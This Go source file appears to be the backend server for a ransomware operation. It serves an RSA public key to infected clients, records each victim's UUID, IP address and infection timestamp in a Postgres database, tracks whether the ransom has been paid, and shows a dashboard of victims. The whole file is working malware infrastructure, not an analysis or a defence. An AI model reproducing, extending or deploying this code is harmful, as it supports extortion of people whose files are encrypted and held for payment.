package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/joho/godotenv"
	"gorm.io/driver/postgres"
	"gorm.io/gorm"
)

var db *gorm.DB

func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("your transaction id"))
}

type victimHtmlDisplay struct {
	Count   int
	Victims []Victim
}

func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	var victims []Victim
	db.Find(&victims)

	htmlDisplay := &victimHtmlDisplay{
		Count:   len(victims),
		Victims: victims,
	}

	tmpl := template.Must(template.ParseFiles("./templates/victims.html"))
	if err := tmpl.Execute(w, htmlDisplay); err != nil {
		http.Error(w, fmt.Sprintf("could not execute html template: %s", err), http.StatusInternalServerError)
		return
	}
}

func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadFile("./public.pem")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not get rsa public key: %s", err),
			http.StatusInternalServerError)
	}

	// w.Header().Set("Content-Type", "text/plain")
	w.Write(data)
}

type Victim struct {
	gorm.Model
	UUID      string `json:"uuid"` // A unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
	Completed bool   `json:"completed"` // A indicator if the transaction has been payed.
}

type newVictim struct {
	UUID      string `json:"uuid"`
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if r.Header.Get("Content-Type") != "application/json" {
		http.Error(w, fmt.Sprintf("wrong content type, wanted: application/json, got: %s",
			r.Header.Get("Content-Type")), http.StatusBadRequest)
		return
	}

	// parse json data from the request
	var victimData newVictim
	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
			http.StatusInternalServerError)
		return
	}

	// The uuid is created on the client-side, since then the client also easily knows
	// its own uuid.

	victim := &Victim{
		UUID:      victimData.UUID,
		Timestamp: victimData.Timestamp,
		IP:        victimData.IP,
		Completed: false,
	}

	db.Create(victim)
	w.WriteHeader(http.StatusOK)
}

func main() {
	// Load environment variables, such that we can take database parameters
	if err := godotenv.Load(); err != nil {
		log.Fatalf("could not load environment variables: %s", err)
	}

	dbHost := os.Getenv("db_host")
	dbPort := os.Getenv("db_port")
	dbUser := os.Getenv("db_user")
	dbName := os.Getenv("db_name")

	var err error
	db, err = gorm.Open(postgres.New(postgres.Config{
		DSN: fmt.Sprintf("host=%s port=%s user=%s dbname=%s sslmode=disable",
			dbHost, dbPort, dbUser, dbName),
	}), &gorm.Config{})

	if err != nil {
		log.Fatalf("could not establish a database connection: %s", err)
	}

	// always migrate the victim model
	db.AutoMigrate(&Victim{})

	http.HandleFunc("/get_transaction", GiveTransactionID)
	http.HandleFunc("/pubkey", GetRSAPubKey)
	http.HandleFunc("/register", RegisterNewVictim)
	http.HandleFunc("/dashboard", ServeVictimsDisplay)

	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		log.Fatalf("error while running listenandserver: %s", err.Error())
	}
}
